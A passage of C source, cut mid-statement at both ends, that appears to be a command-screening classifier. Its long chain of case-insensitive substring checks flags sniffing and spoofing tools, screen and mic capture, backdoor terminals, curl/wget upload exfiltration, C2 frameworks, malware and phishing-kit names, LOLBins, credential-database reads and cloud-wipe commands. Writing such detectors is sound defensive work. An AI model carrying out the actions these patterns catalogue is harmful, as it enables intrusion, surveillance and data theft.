                    ci_contains(text, "--install"))) {
            what = "secure-boot/boot-entry/alternatives primitive";
        } else if ((ci_contains(text, "tcpdump") && ci_contains(text, " -w")) ||
                   (ci_contains(text, "tshark") && ci_contains(text, " -w")) ||
                   ci_contains(text, "dumpcap") || ci_contains(text, "ngrep") ||
                   ci_contains(text, "tcpflow") || ci_contains(text, "arpspoof") ||
                   ci_contains(text, "dnsspoof") || ci_contains(text, "macof") ||
                   ci_contains(text, "yersinia") || ci_contains(text, "slowloris") ||
                   ci_contains(text, "nping") ||
                   (ci_contains(text, "ostinato") && ci_contains(text, " -"))) {
            what = "sniff/spoof/DoS tool primitive";
        /* ── c239: GUI/input injection + screen/mic capture +
         * web-terminal/VNC backdoors + eBPF + exfil upload +
         * AD-recon/C2/RAT/phishing names + SUID install +
         * sqlite cred-db + LOLBin names ── */
        } else if (ci_contains(text, "xdotool") || ci_contains(text, "ydotool") ||
                   ci_contains(text, "wtype") ||
                   (ci_contains(text, "xhost") && ci_contains(text, " +")) ||
                   (ci_contains(text, "import") && ci_contains(text, "-window")) ||
                   ci_contains(text, "scrot") ||
                   ci_contains(text, "gnome-screenshot") ||
                   ci_contains(text, "flameshot") ||
                   (ci_contains(text, "maim") && ci_contains(text, " -")) ||
                   (ci_contains(text, "spectacle") && ci_contains(text, " -")) ||
                   ci_contains(text, "wf-recorder") || ci_contains(text, "xwd") ||
                   (ci_contains(text, "obs") && ci_contains(text, "--start")) ||
                   (ci_contains(text, "ffmpeg") &&
                    (ci_contains(text, "-f x11grab") || ci_contains(text, "avfoundation") ||
                     ci_contains(text, "-f pulse") || ci_contains(text, "-f alsa") ||
                     ci_contains(text, "-f gdigrab") || ci_contains(text, "-f v4l2") ||
                     ci_contains(text, "-f dshow"))) ||
                   ci_contains(text, "parecord") || ci_contains(text, "arecord") ||
                   ci_contains(text, "parec") ||
                   (ci_contains(text, "sox") &&
                    (ci_contains(text, " -d") || ci_contains(text, " -t"))) ||
                   ci_contains(text, "logkeys") || ci_contains(text, "evsieve") ||
                   (ci_contains(text, "keyd") && ci_contains(text, "monitor"))) {
            what = "GUI-injection/screen-mic capture";
        } else if (ci_contains(text, "ttyd") || ci_contains(text, "gotty") ||
                   ci_contains(text, "shellinabox") || ci_contains(text, "tmate") ||
                   ci_contains(text, "teleconsole") || ci_contains(text, "sish") ||
                   ci_contains(text, "wstunnel") || ci_contains(text, "regeorg") ||
                   ci_contains(text, "pivotnacci") || ci_contains(text, "wetty") ||
                   ci_contains(text, "x11vnc") || ci_contains(text, "vncserver") ||
                   ci_contains(text, "x0vncserver") || ci_contains(text, "tigervnc") ||
                   ci_contains(text, "wayvnc") || ci_contains(text, "bpftool") ||
                   ci_contains(text, "bpftrace")) {
            what = "web-terminal/VNC/eBPF backdoor primitive";
        } else if ((ci_contains(text, "curl") &&
                    ((ci_contains(text, "@") &&
                      (ci_contains(text, " -f") || ci_contains(text, " -d") ||
                       ci_contains(text, "--form") || ci_contains(text, "--data"))) ||
                     ci_contains(text, " -t ") || ci_contains(text, "--upload-file"))) ||
                   (ci_contains(text, "wget") && ci_contains(text, "--post-file"))) {
            what = "curl/wget file-upload exfil form";
        } else if (ci_contains(text, "certipy") || ci_contains(text, "adidnsdump") ||
                   ci_contains(text, "windapsearch") || ci_contains(text, "ldeep") ||
                   ci_contains(text, "pywerview") || ci_contains(text, "rusthound") ||
                   ci_contains(text, "adenum") || ci_contains(text, "ldapdomaindump") ||
                   ci_contains(text, "snaffler") || ci_contains(text, "pingcastle") ||
                   ci_contains(text, "sharploader") || ci_contains(text, "sharpshooter") ||
                   ci_contains(text, "pezor") || ci_contains(text, "gadgettojscript") ||
                   ci_contains(text, "phant0m") || ci_contains(text, "stracciatella") ||
                   ci_contains(text, "invisibilitycloak") || ci_contains(text, "eventlogmaster") ||
                   ci_contains(text, "persistence-finder") || ci_contains(text, "fakessh") ||
                   ci_contains(text, "mailsniper") || ci_contains(text, "cewler") ||
                   ci_contains(text, "poshc2") || ci_contains(text, "nighthawk") ||
                   ci_contains(text, "bruteratel") || ci_contains(text, "brute ratel") ||
                   ci_contains(text, "cobaltstrike") || ci_contains(text, "cobalt strike") ||
                   (ci_contains(text, "bloodhound") && ci_contains(text, " -")) ||
                   (ci_contains(text, "sliver") && ci_contains(text, " -")) ||
                   (ci_contains(text, "havoc") && ci_contains(text, " -")) ||
                   (ci_contains(text, "mythic") && ci_contains(text, " -")) ||
                   (ci_contains(text, "covenant") && ci_contains(text, " -")) ||
                   (ci_contains(text, "empire") && ci_contains(text, " -")) ||
                   (ci_contains(text, "merlin") && ci_contains(text, " -")) ||
                   (ci_contains(text, "viper") && ci_contains(text, " -")) ||
                   (ci_contains(text, "donut") && ci_contains(text, " -")) ||
                   (ci_contains(text, "freeze") && ci_contains(text, " -")) ||
                   (ci_contains(text, "scarecrow") && ci_contains(text, " -")) ||
                   (ci_contains(text, "parallax") && ci_contains(text, " -")) ||
                   (ci_contains(text, "xenomorph") && ci_contains(text, " -")) ||
                   (ci_contains(text, "redline") && ci_contains(text, " -")) ||
                   (ci_contains(text, "raccoon") && ci_contains(text, " -")) ||
                   (ci_contains(text, "vidar") && ci_contains(text, " -")) ||
                   (ci_contains(text, "bumblebee") && ci_contains(text, " -"))) {
            what = "AD-recon/C2/offensive-tool name";
        } else if (ci_contains(text, "asyncrat") || ci_contains(text, "njrat") ||
                   ci_contains(text, "nanocore") || ci_contains(text, "remcos") ||
                   ci_contains(text, "xworm") || ci_contains(text, "venomrat") ||
                   ci_contains(text, "purecrypter") || ci_contains(text, "azorult") ||
                   ci_contains(text, "agenttesla") || ci_contains(text, "agent tesla") ||
                   ci_contains(text, "formbook") || ci_contains(text, "lokibot") ||
                   ci_contains(text, "guloader") || ci_contains(text, "smokeloader") ||
                   ci_contains(text, "icedid") || ci_contains(text, "qakbot") ||
                   ci_contains(text, "qbot") || ci_contains(text, "emotet") ||
                   ci_contains(text, "trickbot") || ci_contains(text, "dridex") ||
                   ci_contains(text, "ursnif") || ci_contains(text, "spyeye") ||
                   ci_contains(text, "danabot") || ci_contains(text, "flubot") ||
                   ci_contains(text, "sharkbot") || ci_contains(text, "ermac") ||
                   ci_contains(text, "spynote") || ci_contains(text, "spymax") ||
                   ci_contains(text, "ahmyth") || ci_contains(text, "droidjack") ||
                   ci_contains(text, "androrat") || ci_contains(text, "omnirat") ||
                   ci_contains(text, "quasarrat") || ci_contains(text, "beef-xss") ||
                   ci_contains(text, "setoolkit") || ci_contains(text, "gophish") ||
                   ci_contains(text, "evilginx") || ci_contains(text, "modlishka") ||
                   ci_contains(text, "zphisher") || ci_contains(text, "shellphish") ||
                   ci_contains(text, "blackeye") || ci_contains(text, "advphishing") ||
                   ci_contains(text, "king-phisher") || ci_contains(text, "wifiphisher") ||
                   ci_contains(text, "wifipumpkin") || ci_contains(text, "airgeddon")) {
            what = "malware-family/phishing-kit name";
        } else if ((ci_contains(text, "install") &&
                    (ci_contains(text, " -m 4") || ci_contains(text, " -m 2") ||
                     ci_contains(text, " -m u+s") || ci_contains(text, " -m +s"))) ||
                   (ci_contains(text, "robocopy") && ci_contains(text, " /b")) ||
                   (ci_contains(text, "runas") && ci_contains(text, "/savecred")) ||
                   (ci_contains(text, "sqlite3") &&
                    (ci_contains(text, "cookies") || ci_contains(text, "logins") ||
                     ci_contains(text, "moz_logins") || ci_contains(text, "login data") ||
                     ci_contains(text, "web data") || ci_contains(text, "places.sqlite"))) ||
                   (ci_contains(text, "msbuild") &&
                    (ci_contains(text, " \\\\") || ci_contains(text, "http"))) ||
                   (ci_contains(text, "esentutl") && ci_contains(text, " /y")) ||
                   ci_contains(text, "extrac32") || ci_contains(text, "wextract") ||
                   ci_contains(text, "pcwrun") || ci_contains(text, "masvc") ||
                   (ci_contains(text, "oobe") && ci_contains(text, " -")) ||
                   (ci_contains(text, "ieexec") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\"))) ||
                   (ci_contains(text, "ie4uinit") && ci_contains(text, " -show")) ||
                   (ci_contains(text, "installutil") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\") ||
                     ci_contains(text, " /u"))) ||
                   (ci_contains(text, "regasm") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\") ||
                     ci_contains(text, " /u"))) ||
                   (ci_contains(text, "regsvcs") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\") ||
                     ci_contains(text, " /u"))) ||
                   (ci_contains(text, "msxsl") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\"))) ||
                   (ci_contains(text, "ilasm") &&
                    (ci_contains(text, " http") || ci_contains(text, " \\\\"))) ||
                   (ci_contains(text, "verclsid") &&
                    ci_contains(text, " /s") && ci_contains(text, " /c")) ||
                   (ci_contains(text, "syncappvpublishingserver") &&
                    (ci_contains(text, "\";") || ci_contains(text, "';"))) ||
                   (ci_contains(text, "pcalua") && ci_contains(text, " -a")) ||
                   (ci_contains(text, "procdump") &&
                    (ci_contains(text, " -ma") || ci_contains(text, " -mm") ||
                     ci_contains(text, "lsass")))) {
            what = "suid-install/cred-db/lolbin-name primitive";
        /* c240: process-memory/core scrape + namespace/dbus exec +
         * stream/upload exfil + file-serve hosts + MITM + macOS
         * defense-off/exec/account primitives ── */
        } else if ((ci_contains(text, "lldb") && ci_contains(text, " -p")) ||
                   ci_contains(text, "gcore") || ci_contains(text, "eu-stack") ||
                   ci_contains(text, "procstat") ||
                   (ci_contains(text, "coredumpctl") &&
                    (ci_contains(text, " dump") || ci_contains(text, " gdb") ||
                     ci_contains(text, " debug"))) ||
                   ((ci_contains(text, "cat ") || ci_contains(text, "head ") ||
                     ci_contains(text, "xxd ") || ci_contains(text, "strings ") ||
                     ci_contains(text, "hexdump") || ci_contains(text, "tail ") ||
                     ci_contains(text, "od ")) &&
                    (ci_contains(text, " /dev/mem") ||
                     ci_contains(text, " /dev/kmem") ||
                     ci_contains(text, " /dev/port"))) ||
                   (ci_contains(text, "/proc/") &&
                    ((ci_contains(text, "/mem") &&
                      !ci_contains(text, "/meminfo")) ||
                     ci_contains(text, "/environ") ||
                     ci_contains(text, "/maps") ||
                     ci_contains(text, "kcore")))) {
            what = "memory/core scrape primitive";
        } else if ((ci_contains(text, "unshare") &&
                    (ci_contains(text, " -r") || ci_contains(text, " -u") ||
                     ci_contains(text, " -m") || ci_contains(text, "-rm") ||
                     ci_contains(text, "-ur") ||
                     ci_contains(text, "--map-root") ||
                     ci_contains(text, "--user") ||
                     ci_contains(text, "--mount") ||
                     ci_contains(text, "--fork"))) ||
                   (ci_contains(text, "machinectl") &&
                    (ci_contains(text, "shell") || ci_contains(text, "exec"))) ||
                   (ci_contains(text, "busctl") && ci_contains(text, " call")) ||
                   (ci_contains(text, "dbus-send") && ci_contains(text, "--system")) ||
                   (ci_contains(text, "loginctl") &&
                    ci_contains(text, "enable-linger"))) {
            what = "namespace/dbus/systemd exec primitive";
        } else if (((ci_contains(text, "nc ") || ci_contains(text, "ncat") ||
                     ci_contains(text, "netcat")) && ci_contains(text, " <")) ||
                   ((ci_contains(text, "tar") || ci_contains(text, "dd ") ||
                     ci_contains(text, "cat ")) &&
                    (ci_contains(text, "| nc") || ci_contains(text, "|nc") ||
                     ci_contains(text, "| ssh") || ci_contains(text, "|ssh") ||
                     ci_contains(text, "| socat") ||
                     ci_contains(text, "|socat"))) ||
                   (ci_contains(text, "nsupdate") &&
                    (ci_contains(text, " -k") || ci_contains(text, " -y"))) ||
                   (ci_contains(text, "openssl") &&
                    ci_contains(text, "s_server")) ||
                   ci_contains(text, "cryptcat") ||
                   ci_contains(text, "php -s") ||
                   ci_contains(text, "-m http.server") ||
                   ci_contains(text, "ruby -run") ||
                   ci_contains(text, "darkhttpd") ||
                   ci_contains(text, "miniserve") || ci_contains(text, "webfsd") ||
                   ci_contains(text, "thttpd") || ci_contains(text, "smbserver") ||
                   ci_contains(text, "updog") || ci_contains(text, "twistd") ||
                   ci_contains(text, "-m smtpd") ||
                   ((ci_contains(text, "ifconfig") ||
                     ci_contains(text, "ip link")) &&
                    ci_contains(text, "promisc")) ||
                   (ci_contains(text, "ip neigh") &&
                    (ci_contains(text, "add") || ci_contains(text, "replace") ||
                     ci_contains(text, "del")))) {
            what = "stream-exfil/serve-host/mitm primitive";
        } else if ((ci_contains(text, "spctl") &&
                    (ci_contains(text, "global-disable") ||
                     ci_contains(text, "--add"))) ||
                   (ci_contains(text, "csrutil") &&
                    (ci_contains(text, " clear") ||
                     ci_contains(text, "authenticated-root"))) ||
                   (ci_contains(text, "fdesetup") &&
                    (ci_contains(text, "disable") ||
                     ci_contains(text, "remove") ||
                     ci_contains(text, "authrestart"))) ||
                   (ci_contains(text, "profiles") &&
                    (ci_contains(text, " -i") || ci_contains(text, " -i") ||
                     ci_contains(text, "install") ||
                     ci_contains(text, "remove"))) ||
                   (ci_contains(text, "launchctl") &&
                    (ci_contains(text, "bootout") ||
                     ci_contains(text, "disable"))) ||
                   (ci_contains(text, "dscl") &&
                    (ci_contains(text, " create") ||
                     ci_contains(text, " -create") ||
                     ci_contains(text, " passwd") ||
                     ci_contains(text, " -passwd") ||
                     ci_contains(text, " append") ||
                     ci_contains(text, " -append") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " -delete") ||
                     ci_contains(text, " change") ||
                     ci_contains(text, " -change"))) ||
                   (ci_contains(text, "sysadminctl") &&
                    (ci_contains(text, "-adduser") ||
                     ci_contains(text, "-deleteuser") ||
                     ci_contains(text, "-resetpassword") ||
                     ci_contains(text, "-securetokeno") ||
                     ci_contains(text, "-disablesecuretoken") ||
                     ci_contains(text, "-autologin"))) ||
                   (ci_contains(text, "pwpolicy") &&
                    (ci_contains(text, "setaccount") ||
                     ci_contains(text, "setuser") ||
                     ci_contains(text, "setpass") ||
                     ci_contains(text, " -u"))) ||
                   (ci_contains(text, "defaults write") &&
                    (ci_contains(text, "loginhook") ||
                     ci_contains(text, "logouthook") ||
                     ci_contains(text, "autorun"))) ||
                   (ci_contains(text, "hdiutil") && ci_contains(text, "http")) ||
                   ci_contains(text, "do shell script") ||
                   (ci_contains(text, "security") &&
                    (ci_contains(text, "authorizationdb") ||
                     ci_contains(text, "set-keychain"))) ||
                   (ci_contains(text, "kickstart") &&
                    (ci_contains(text, "-activate") ||
                     ci_contains(text, "-configure") ||
                     ci_contains(text, "-install") ||
                     ci_contains(text, "-restart"))) ||
                   ci_contains(text, "screencapture") ||
                   ci_contains(text, "pbpaste") ||
                   (ci_contains(text, "sntp") && ci_contains(text, " -s")) ||
                   (ci_contains(text, "scutil") && ci_contains(text, "--nc")) ||
                   (ci_contains(text, "cupsctl") &&
                    ci_contains(text, "--remote")) ||
                   (ci_contains(text, "networksetup") &&
                    (ci_contains(text, "-setautologin") ||
                     ci_contains(text, "-setvnc"))) ||
                   (ci_contains(text, "shortcuts") &&
                    ci_contains(text, " run ")) ||
                   (ci_contains(text, "automator") &&
                    ci_contains(text, " -i"))) {
            what = "macOS defense-off/exec/account primitive";
        /* c241: Windows audit/ACL/AD/defense primitives + Unix
         * mount/SELinux/audit-off/xfrm/ebtables/bridge/monitor +
         * session-record + BSD + DNS/infra destructive forms ── */
        } else if ((ci_contains(text, "wevtutil") &&
                    ci_contains(text, " sl")) ||
                   (ci_contains(text, "logman") &&
                    (ci_contains(text, " create") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " stop"))) ||
                   ci_contains(text, "pktmon") ||
                   (ci_contains(text, "netsh") &&
                    ci_contains(text, "advfirewall") &&
                    (ci_contains(text, " add ") ||
                     ci_contains(text, " delete ") ||
                     ci_contains(text, " set "))) ||
                   (ci_contains(text, "cmdkey") &&
                    ci_contains(text, " /generic")) ||
                   (ci_contains(text, "net group") &&
                    ci_contains(text, " /add")) ||
                   (ci_contains(text, "sc ") &&
                    (ci_contains(text, " failure") ||
                     ci_contains(text, " sdset"))) ||
                   (ci_contains(text, "icacls") &&
                    ci_contains(text, " /deny")) ||
                   (ci_contains(text, "cacls") &&
                    ci_contains(text, " /g") &&
                    !ci_contains(text, "icacls")) ||
                   (ci_contains(text, "subinacl") &&
                    (ci_contains(text, " /grant") ||
                     ci_contains(text, " /deny"))) ||
                   (ci_contains(text, "wbadmin") &&
                    ci_contains(text, "stop job")) ||
                   ci_contains(text, "dsquery") || ci_contains(text, "dsadd") ||
                   ci_contains(text, "dsmod") || ci_contains(text, "dsrm") ||
                   (ci_contains(text, "csvde") &&
                    ci_contains(text, " -f")) ||
                   (ci_contains(text, "ldifde") &&
                    ci_contains(text, " -f")) ||
                   (ci_contains(text, "netdom") &&
                    (ci_contains(text, " add") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " join"))) ||
                   ci_contains(text, "nltest") ||
                   (ci_contains(text, "w32tm") &&
                    ci_contains(text, " /config")) ||
                   (ci_contains(text, "route ") &&
                    ci_contains(text, " delete")) ||
                   (ci_contains(text, "reg ") &&
                    (ci_contains(text, " save") ||
                     ci_contains(text, " export")) &&
                    (ci_contains(text, "sam") ||
                     ci_contains(text, "security") ||
                     ci_contains(text, "system") ||
                     ci_contains(text, "ntds"))) ||
                   (ci_contains(text, "msiexec") &&
                    ci_contains(text, " /x")) ||
                   (ci_contains(text, "schtasks") &&
                    ci_contains(text, " /delete")) ||
                   ci_contains(text, "rwinsta") ||
                   ci_contains(text, "tskill") || ci_contains(text, "tsshutdn") ||
                   (ci_contains(text, "dsacls") &&
                    ci_contains(text, " /g")) ||
                   (ci_contains(text, "pnputil") &&
                    (ci_contains(text, "/add-driver") ||
                     ci_contains(text, "/delete-driver")))) {
            what = "windows audit/ACL/AD/defense primitive";
        } else if ((ci_contains(text, "mount") &&
                    (ci_contains(text, "--bind") ||
                     ci_contains(text, "--rbind") ||
                     ci_contains(text, "remount"))) ||
                   (ci_contains(text, "setenforce") &&
                    ci_contains(text, "permissive")) ||
                   (ci_contains(text, "semodule") &&
                    (ci_contains(text, " -i") || ci_contains(text, " -r") ||
                     ci_contains(text, " -e") || ci_contains(text, " -d") ||
                     ci_contains(text, "--install") ||
                     ci_contains(text, "--remove"))) ||
                   (ci_contains(text, "setsebool") &&
                    (ci_contains(text, " -") || ci_contains(text, " on") ||
                     ci_contains(text, " off"))) ||
                   (ci_contains(text, "semanage") &&
                    (ci_contains(text, " -a") || ci_contains(text, " -m") ||
                     ci_contains(text, " -d") || ci_contains(text, " -r") ||
                     ci_contains(text, "--add") || ci_contains(text, "--modify") ||
                     ci_contains(text, "--delete") ||
                     ci_contains(text, "permissive"))) ||
                   ci_contains(text, "aa-disable") ||
                   ci_contains(text, "aa-teardown") ||
                   (ci_contains(text, "auditctl") &&
                    (ci_contains(text, " -e 0") || ci_contains(text, " -e0") ||
                     ci_contains(text, " -e 2") || ci_contains(text, " -e2") ||
                     ci_contains(text, " -d"))) ||
                   (ci_contains(text, "ip xfrm") &&
                    (ci_contains(text, "add") || ci_contains(text, "update") ||
                     ci_contains(text, "delete") || ci_contains(text, "flush"))) ||
                   (ci_contains(text, "ebtables") &&
                    (ci_contains(text, " -a") || ci_contains(text, " -i") ||
                     ci_contains(text, " -p") || ci_contains(text, " -f") ||
                     ci_contains(text, "--policy"))) ||
                   (ci_contains(text, "brctl") &&
                    (ci_contains(text, "addbr") || ci_contains(text, "addif") ||
                     ci_contains(text, "delbr") || ci_contains(text, "delif"))) ||
                   ((ci_contains(text, "iw ") ||
                     ci_contains(text, "iwconfig")) &&
                    ci_contains(text, "monitor")) ||
                   ci_contains(text, "airmon-ng") ||
                   ci_contains(text, "ltrace") ||
                   (ci_contains(text, "strace") &&
                    (ci_contains(text, " -f") || ci_contains(text, " -e"))) ||
                   (ci_contains(text, "script ") &&
                    ci_contains(text, " -q")) ||
                   ci_contains(text, "ttyrec") ||
                   (ci_contains(text, "asciinema") &&
                    ci_contains(text, " rec")) ||
                   ci_contains(text, "sysdig") || ci_contains(text, "falco ") ||
                   ci_contains(text, "kldload") || ci_contains(text, "kldunload") ||
                   (ci_contains(text, "ipfw") &&
                    (ci_contains(text, "add") || ci_contains(text, "flush") ||
                     ci_contains(text, "delete") || ci_contains(text, "pipe") ||
                     ci_contains(text, "queue"))) ||
                   (ci_contains(text, "svc ") &&
                    ci_contains(text, " -d")) ||
                   (ci_contains(text, "rcctl") &&
                    (ci_contains(text, "stop") || ci_contains(text, "disable") ||
                     ci_contains(text, "restart"))) ||
                   (ci_contains(text, "kexec") &&
                    (ci_contains(text, " -l") || ci_contains(text, " -e"))) ||
                   (ci_contains(text, "grubby") &&
                    ci_contains(text, "--args")) ||
                   ci_contains(text, "grub2-set-default") ||
                   ci_contains(text, "grub-set-default") ||
                   (ci_contains(text, "dracut") &&
                    (ci_contains(text, "--add") ||
                     ci_contains(text, "--install") ||
                     ci_contains(text, "--add-drivers") ||
                     ci_contains(text, "--kernel-image"))) ||
                   (ci_contains(text, "realm") &&
                    (ci_contains(text, " join") ||
                     ci_contains(text, " leave"))) ||
                   (ci_contains(text, "adcli") &&
                    (ci_contains(text, " join") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "authselect") &&
                    (ci_contains(text, " select") ||
                     ci_contains(text, " apply") ||
                     ci_contains(text, " enable") ||
                     ci_contains(text, " disable"))) ||
                   (ci_contains(text, "authconfig") &&
                    (ci_contains(text, "--update") ||
                     ci_contains(text, "--enable") ||
                     ci_contains(text, "--disable"))) ||
                   (ci_contains(text, "cryptsetup") &&
                    (ci_contains(text, "luksremovekey") ||
                     ci_contains(text, "lukskillslot") ||
                     ci_contains(text, "reencrypt") ||
                     ci_contains(text, "luksheaderbackup") ||
                     ci_contains(text, " remove"))) ||
                   (ci_contains(text, "resolvectl") &&
                    (ci_contains(text, " dns ") ||
                     ci_contains(text, " nta")))) {
            what = "unix mount/selinux/audit/l2/session-record primitive";
        } else if ((ci_contains(text, "rndc") &&
                    (ci_contains(text, "flush") || ci_contains(text, "reload") ||
                     ci_contains(text, "addzone") || ci_contains(text, "delzone") ||
                     ci_contains(text, "modzone") || ci_contains(text, "signing") ||
                     ci_contains(text, "halt") || ci_contains(text, "stop"))) ||
                   (ci_contains(text, "unbound-control") &&
                    (ci_contains(text, "reload") || ci_contains(text, "load") ||
                     ci_contains(text, "flush") || ci_contains(text, "stub") ||
                     ci_contains(text, "forward"))) ||
                   ci_contains(text, "knotc") ||
                   ci_contains(text, "pdns_control") ||
                   (ci_contains(text, "terraform") &&
                    ci_contains(text, " destroy")) ||
                   (ci_contains(text, "pulumi") &&
                    ci_contains(text, " destroy")) ||
                   (ci_contains(text, "tofu") &&
                    ci_contains(text, " destroy")) ||
                   (ci_contains(text, "kubectl") &&
                    ci_contains(text, " delete") &&
                    ci_contains(text, "--all")) ||
                   (ci_contains(text, "vault") &&
                    (ci_contains(text, " kv") ||
                     ci_contains(text, " secrets") ||
                     ci_contains(text, " policy") ||
                     ci_contains(text, " token"))) ||
                   (ci_contains(text, "consul") &&
                    (ci_contains(text, " kv") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "etcdctl") &&
                    (ci_contains(text, " put") || ci_contains(text, " del") ||
                     ci_contains(text, " txn"))) ||
                   (ci_contains(text, "nomad") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " alloc") ||
                     ci_contains(text, " stop"))) ||
                   (ci_contains(text, "aws") &&
                    (ci_contains(text, "s3 rb") ||
                     ci_contains(text, "s3api delete"))) ||
                   (ci_contains(text, "gsutil") &&
                    (ci_contains(text, " rm") || ci_contains(text, " rb"))) ||
                   (ci_contains(text, "az storage") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " remove"))) ||
                   ci_contains(text, "aria2c") || ci_contains(text, "httpie") ||
                   (ci_contains(text, "transmission-remote") &&
                    ci_contains(text, " -a")) ||
                   (ci_contains(text, "nmcli") &&
                    (ci_contains(text, " mod") ||
                     ci_contains(text, " down") ||
                     ci_contains(text, " delete")))) {
            what = "dns-control/infra-destruct/cloud-wipe primitive";
        /* c242: Windows eventlog/defense/firewall/AD PS cmdlets +
         * boot/cert/sticky-keys/tunnel/exec primitives ── */
        } else if (ci_contains(text, "eventcreate") ||
                   ci_contains(text, "clear-eventlog") ||
                   ci_contains(text, "remove-eventlog") ||
                   ci_contains(text, "limit-eventlog") ||
                   ci_contains(text, "new-eventlog") ||
                   ci_contains(text, "write-eventlog") ||
                   ci_contains(text, "get-eventlog") ||
                   ci_contains(text, "get-winevent") ||
                   ci_contains(text, "new-netfirewallrule") ||
                   ci_contains(text, "set-netfirewallrule") ||
                   ci_contains(text, "disable-netfirewallrule") ||
                   ci_contains(text, "remove-netfirewallrule") ||
                   (ci_contains(text, "set-netfirewallprofile") &&
                    ci_contains(text, "false")) ||
                   ci_contains(text, "disable-netadapter") ||
                   ci_contains(text, "set-dnsclientserveraddress") ||
                   ci_contains(text, "set-dnsclientglobalsetting") ||
                   ci_contains(text, "new-netipaddress") ||
                   ci_contains(text, "remove-netipaddress") ||
                   ci_contains(text, "set-netipaddress") ||
                   ci_contains(text, "remove-netroute") ||
                   ci_contains(text, "new-netroute") ||
                   ci_contains(text, "new-netneighbor") ||
                   ci_contains(text, "set-netneighbor") ||
                   ci_contains(text, "remove-netneighbor") ||
                   (ci_contains(text, "remove-item") &&
                    ci_contains(text, "-recurse") &&
                    ci_contains(text, "-force")) ||
                   ci_contains(text, "add-computer") ||
                   ci_contains(text, "remove-computer") ||
                   ci_contains(text, "set-smbserverconfiguration") ||
                   ci_contains(text, "set-smbclientconfiguration") ||
                   ci_contains(text, "new-smbshare") ||
                   ci_contains(text, "remove-smbshare") ||
                   ci_contains(text, "set-smbshare") ||
                   ci_contains(text, "grant-smbshareaccess") ||
                   ci_contains(text, "block-smbshareaccess") ||
                   ci_contains(text, "invoke-dcsync") ||
                   ci_contains(text, "invoke-kerberoast") ||
                   ci_contains(text, "invoke-tokenman") ||
                   ci_contains(text, "invoke-reflective") ||
                   ci_contains(text, "invoke-dllinjection") ||
                   ci_contains(text, "invoke-shell") ||
                   ci_contains(text, "invoke-ninjacopy") ||
                   ci_contains(text, "invoke-credential") ||
                   ci_contains(text, "invoke-userhunter") ||
                   ci_contains(text, "invoke-stealthuserhunter") ||
                   ci_contains(text, "invoke-psexec") ||
                   ci_contains(text, "invoke-wmiexec") ||
                   ci_contains(text, "invoke-smbexec") ||
                   ci_contains(text, "invoke-dcomexec") ||
                   ci_contains(text, "invoke-bloodhound") ||
                   ci_contains(text, "invoke-powerview") ||
                   ci_contains(text, "invoke-assembledbinary") ||
                   ci_contains(text, "invoke-inveigh") ||
                   ci_contains(text, "invoke-empire") ||
                   ci_contains(text, "invoke-sharphound") ||
                   ci_contains(text, "invoke-recon") ||
                   ci_contains(text, "get-aduser") ||
                   ci_contains(text, "get-adcomputer") ||
                   ci_contains(text, "get-adgroupmember") ||
                   ci_contains(text, "get-addomain") ||
                   ci_contains(text, "get-forest") ||
                   ci_contains(text, "get-domaintrust") ||
                   ci_contains(text, "get-gpo") ||
                   ci_contains(text, "get-adobject") ||
                   ci_contains(text, "set-aduser") ||
                   ci_contains(text, "set-adobject") ||
                   ci_contains(text, "new-adobject") ||
                   ci_contains(text, "add-domainobjectacl") ||
                   ci_contains(text, "set-domainobject") ||
                   ci_contains(text, "get-adprincipal") ||
                   ci_contains(text, "get-adserviceaccount") ||
                   ci_contains(text, "remove-aduser") ||
                   ci_contains(text, "remove-adcomputer") ||
                   ci_contains(text, "remove-adgroupmember") ||
                   ci_contains(text, "get-adgroup") ||
                   ci_contains(text, "get-addomaincontroller") ||
                   ci_contains(text, "set-adaccountpassword") ||
                   ci_contains(text, "enable-adaccount") ||
                   ci_contains(text, "unlock-adaccount") ||
                   (ci_contains(text, "new-psdrive") &&
                    ci_contains(text, "\\\\")) ||
                   (ci_contains(text, "net computer") &&
                    (ci_contains(text, " /add") ||
                     ci_contains(text, " /del"))) ||
                   (ci_contains(text, "bash.exe") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "regedit") &&
                    (ci_contains(text, " /e") ||
                     ci_contains(text, " /s"))) ||
                   ci_contains(text, "regini") ||
                   ci_contains(text, "hh.exe") ||
                   ci_contains(text, "hh ") ||
                   ci_contains(text, "sdbinst") ||
                   ((ci_contains(text, "vbc ") ||
                     ci_contains(text, "vbc.exe") ||
                     ci_contains(text, "csc ") ||
                     ci_contains(text, "csc.exe")) &&
                    (ci_contains(text, " /") || ci_contains(text, "-") ||
                     ci_contains(text, ".cs") || ci_contains(text, ".vb"))) ||
                   ((ci_contains(text, "jsc ") ||
                     ci_contains(text, "jsc.exe")) &&
                    (ci_contains(text, " /") || ci_contains(text, "-") ||
                     ci_contains(text, ".js"))) ||
                   (ci_contains(text, "caspol") &&
                    (ci_contains(text, " -s") || ci_contains(text, " -m") ||
                     ci_contains(text, " -a") || ci_contains(text, " -pp") ||
                     ci_contains(text, " -cg") || ci_contains(text, " -rs") ||
                     ci_contains(text, " -en"))) ||
                   (ci_contains(text, "infdefaultinstall") &&
                    (ci_contains(text, " /") || ci_contains(text, "-") ||
                     ci_contains(text, ".inf") || ci_contains(text, "http"))) ||
                   ci_contains(text, "settingcontent") ||
                   ci_contains(text, "dfshim") || ci_contains(text, "dfsvc") ||
                   ci_contains(text, "xbap") ||
                   (ci_contains(text, "winscp") &&
                    (ci_contains(text, " /command") ||
                     ci_contains(text, " /script") ||
                     ci_contains(text, " /console"))) ||
                   (ci_contains(text, "plink") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "pscp") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "net1 ") ||
                   (ci_contains(text, "msra") &&
                    (ci_contains(text, "/offerra") ||
                     ci_contains(text, "/saveasfile") ||
